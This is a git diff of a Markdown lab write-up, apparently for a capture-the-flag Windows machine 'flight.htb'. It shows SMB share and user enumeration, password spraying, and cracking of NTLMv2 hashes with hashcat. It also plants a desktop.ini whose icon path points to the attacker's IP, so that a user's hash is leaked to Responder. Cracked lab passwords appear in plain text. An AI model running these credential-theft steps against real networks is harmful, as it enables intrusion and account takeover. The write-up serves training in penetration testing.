@@ -301,7 +301,7 @@ Let's see if we can grab a hash with `Responder`!
 Start Responder:
 
 ```
-sudo responder -I tu
+sudo responder -I tun0 -wPv
 ```
 
 Capture NTLMv2 Hash:
@@ -326,10 +326,216 @@ Time to crack this hash!
 hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt -O
 ```
 
-Password:
+Creds:
 
 ```
 svc_apache:S@Ss!K@*t13
+```
+
+* Now that we have valid credentials, I attempted Kerberoasting, but it did not work
+
+#### CrackMapExec
+
+Let's pass these new creds around the machine:
+
+#### SMB
+
+```
+crackmapexec smb 10.129.95.32 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
+SMB         10.129.95.32    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.95.32    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.95.32    445    G0               [+] Enumerated shares
+SMB         10.129.95.32    445    G0               Share           Permissions     Remark
+SMB         10.129.95.32    445    G0               -----           -----------     ------
+SMB         10.129.95.32    445    G0               ADMIN$                          Remote Admin
+SMB         10.129.95.32    445    G0               C$                              Default share
+SMB         10.129.95.32    445    G0               IPC$            READ            Remote IPC
+SMB         10.129.95.32    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.95.32    445    G0               Shared          READ            
+SMB         10.129.95.32    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.95.32    445    G0               Users           READ            
+SMB         10.129.95.32    445    G0               Web             READ 
+```
+
+#### Grabbing Users
+
+```
+crackmapexec smb 10.129.95.32 -u 'svc_apache' -p 'S@Ss!K@*t13' --users
+SMB         10.129.95.32    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.95.32    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.95.32    445    G0               [+] Enumerated domain user(s)
+SMB         10.129.95.32    445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
+SMB         10.129.95.32    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web
+SMB         10.129.95.32    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
+SMB         10.129.95.32    445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager
+SMB         10.129.95.32    445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he's here
+SMB         10.129.95.32    445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer
+SMB         10.129.95.32    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer
+SMB         10.129.95.32    445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
+SMB         10.129.95.32    445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
+SMB         10.129.95.32    445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
+SMB         10.129.95.32    445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
+SMB         10.129.95.32    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
+SMB         10.129.95.32    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+SMB         10.129.95.32    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+SMB         10.129.95.32    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
+```
+
+Users List:
+
+```
+O.Possum
+svc_apache
+V.Stevens
+D.Truff
+I.Francis
+W.Walker
+C.Bum
+M.Gold
+L.Kein
+G.Lors
+R.Cold
+S.Moon
+krbtgt
+Guest
+Administrator
+```
+
+#### AS-REPRoasting Attempt
+
+```
+impacket-GetNPUsers flight.htb/ -dc-ip 10.129.95.32 -no-pass -usersfile users.txt 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User O.Possum doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc_apache doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User V.Stevens doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User D.Truff doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User I.Francis doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User W.Walker doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User C.Bum doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User M.Gold doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User L.Kein doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User G.Lors doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User R.Cold doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User S.Moon doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+#### Bruteforce
+
+```
+crackmapexec smb 10.129.95.32 -u users.txt -p 'S@Ss!K@*t13'  --continue-on-success
+SMB         10.129.95.32    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.95.32    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.95.32    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.129.95.32    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.95.32    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+```
+
+We can now see what we have access to with <mark style="color:yellow;">S.Moon</mark>!
+
+```
+crackmapexec smb 10.129.95.32 -u S.Moon -p 'S@Ss!K@*t13' --shares
+SMB         10.129.95.32    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.95.32    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.129.95.32    445    G0               [+] Enumerated shares
+SMB         10.129.95.32    445    G0               Share           Permissions     Remark
+SMB         10.129.95.32    445    G0               -----           -----------     ------
+SMB         10.129.95.32    445    G0               ADMIN$                          Remote Admin
+SMB         10.129.95.32    445    G0               C$                              Default share
+SMB         10.129.95.32    445    G0               IPC$            READ            Remote IPC
+SMB         10.129.95.32    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.95.32    445    G0               Shared          READ,WRITE      
+SMB         10.129.95.32    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.95.32    445    G0               Users           READ            
+SMB         10.129.95.32    445    G0               Web             READ
+```
+
+* We now have <mark style="color:yellow;">Read/Write on Shared</mark>
+* We can write a desktop.ini file to the writeable share in hopes of capturing an NTLM hash
+  * This method can be found on hacktricks
+
+desktop.ini:
+
+```
+cat "[.ShellClassInfo]
+IconResource=\\10.10.14.38\test" >> desktop.ini
+```
+
+cat desktop.ini:
+
+```
+[.ShellClassInfo]
+IconResource=\\10.10.14.38\test
+```
+
+Authenticate to Shared SMB share via `smbclient`:
+
+```
+smbclient '\\\\flight.htb\\Shared' -I flight.htb -U S.Moon 'S@Ss!K@*t13'
+Password: S@Ss!K@*t13
+
+smb: \> put desktop.ini
+```
+
+Start responder if you do not have it running still (you should always keep this running during a Windows/AD engagement!):
+
+```
+sudo responder -I tun0 -wPv
+```
+
+Wait a little bit and you will see the NTLMv2 hash for C.Bum come across the network:
+
+<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+Time to crack this hash:
+
+```
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+
+Creds:
+
+```
+C.Bum:Tikkycoll_431012284
+```
+
+#### Crackmapexec
+
+```
+crackmapexec smb 10.129.95.32 -u C.Bum -p 'Tikkycoll_431012284' --shares
+SMB         10.129.95.32    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.95.32    445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
+SMB         10.129.95.32    445    G0               [+] Enumerated shares
+SMB         10.129.95.32    445    G0               Share           Permissions     Remark
+SMB         10.129.95.32    445    G0               -----           -----------     ------
+SMB         10.129.95.32    445    G0               ADMIN$                          Remote Admin
+SMB         10.129.95.32    445    G0               C$                              Default share
+SMB         10.129.95.32    445    G0               IPC$            READ            Remote IPC
+SMB         10.129.95.32    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.95.32    445    G0               Shared          READ,WRITE      
+SMB         10.129.95.32    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.95.32    445    G0               Users           READ            
+SMB         10.129.95.32    445    G0               Web             READ,WRITE
+```
+
+* We see that we can now write to the Web share
+
+```
 ```
 
 ## Privilege Escalation
